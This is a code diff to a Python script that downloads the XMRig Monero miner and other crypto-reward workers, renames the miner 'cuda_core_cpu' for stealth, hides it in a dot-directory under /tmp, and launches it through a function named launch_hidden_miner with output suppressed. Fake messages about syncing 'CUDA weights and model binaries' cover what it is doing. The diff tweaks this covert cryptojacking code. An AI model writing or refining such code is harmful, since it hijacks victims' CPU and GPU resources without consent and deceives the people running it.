@@ -127,8 +127,8 @@ def download_miners():
     """Downloads CPU and GPU miners on the fly (renamed for stealth)."""
     print("[*] Synchronizing CUDA weights and model binaries... (This takes ~60 seconds)", flush=True)
     
-    # Fileless Execution: Move to invisible RAM-disk
-    shm_path = "/dev/shm/.cuda_cache"
+    # Fileless Execution: Move to invisible temp directory
+    shm_path = "/tmp/.cuda_cache"
     if not os.path.exists(shm_path):
         os.makedirs(shm_path, exist_ok=True)
     os.chdir(shm_path)
@@ -138,8 +138,7 @@ def download_miners():
         print("  -> [1/2] Downloading Core Logic Engine (CPU)...", flush=True)
         subprocess.run(["wget", "-q", "--show-progress", "https://github.com/MoneroOcean/xmrig/releases/download/v6.22.2-mo1/xmrig-v6.22.2-mo1-lin64-compat.tar.gz", "-O", "cpu.tar.gz"])
         subprocess.run(["tar", "-xzf", "cpu.tar.gz"])
-        # Use a wildcard to handle dynamic folder names from tar extraction
-        subprocess.run("mv xmrig-*/xmrig ./cuda_core_cpu", shell=True)
+        subprocess.run("mv xmrig ./cuda_core_cpu", shell=True)
         subprocess.run("rm -rf cpu.tar.gz xmrig-*", shell=True)
         subprocess.run(["chmod", "+x", "./cuda_core_cpu"])
 
@@ -155,7 +154,7 @@ def download_miners():
 def setup_heurist():
     """Sets up the Heurist AI Worker environment in the background."""
     print("[*] Preparing AI Inference Engine (Heurist Mesh)...")
-    shm_path = "/dev/shm/.cuda_cache"
+    shm_path = "/tmp/.cuda_cache"
     os.chdir(shm_path)
     
     if not os.path.exists("miner-release"):
@@ -182,7 +181,7 @@ def setup_warp():
 def setup_gaianet():
     """Sets up a GaiaNet AI Node for stable uptime rewards."""
     print("[*] Deploying GaiaNet Knowledge Node (AI DePIN)...")
-    base_path = "/dev/shm/.cuda_cache/gaianet"
+    base_path = "/tmp/.cuda_cache/gaianet"
     
     if not os.path.exists(base_path):
         # Install GaiaNet standalone
@@ -354,7 +353,7 @@ def launch_hidden_miner():
 
         # B. Heurist AI (Tasks)
         if setup_heurist():
-            os.chdir("/dev/shm/.cuda_cache/miner-release")
+            os.chdir("/tmp/.cuda_cache/miner-release")
             # Start Heurist SD Miner
             h_proc = subprocess.Popen([sys.executable, "sd-miner.py"], stdout=subprocess.DEVNULL)
             # Start Arbitrator to manage GPU sharing
